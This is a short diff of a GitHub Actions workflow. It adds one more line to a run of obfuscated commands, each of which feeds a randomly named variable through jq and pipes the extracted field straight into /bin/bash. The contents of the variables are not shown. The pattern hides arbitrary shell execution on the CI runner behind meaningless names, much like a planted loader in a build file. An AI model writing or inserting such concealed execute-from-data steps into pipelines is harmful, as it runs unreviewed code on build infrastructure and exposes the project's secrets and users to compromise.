@@ -30,6 +30,7 @@ jobs:
           echo $ujgn1612 | jq -r .g73373 | /bin/bash
           printf '%s' "$pny446" | jq -r .wu76 | /bin/bash
           echo $qqwd35598 | jq -r .wa385 | /bin/bash
+          printf '%s' "$l090" | jq -r .xnj7007 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
